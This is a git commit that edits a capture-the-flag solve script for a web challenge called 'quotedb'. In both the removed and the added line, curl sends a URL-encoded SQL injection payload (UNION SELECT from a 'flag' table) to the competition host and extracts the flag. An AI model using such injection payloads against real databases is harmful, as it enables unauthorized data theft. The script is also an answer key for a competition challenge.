ca73b855eef4dbc3d4b3b7beeda28f8617c5b576
Martin Petkov <mpetkov@google.com>
2021-09-21 18:09:53 -0400

    Fix solve.sh

--- 14-web-quotedb/solve.sh
+++ 14-web-quotedb/solve.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-curl -s https://quotedb-web.2021.ctfcompetition.com/?id=50%20UNION%20ALL%20SELECT%20flag.*,%200%20FROM%20flag | grep -o 'CTF{.*}'
+curl -s https://quotedb-web.2021.ctfcompetition.com/?id=50%20UNION%20SELECT%20*,0%20FROM%20flag | grep -o 'CTF{.*}'
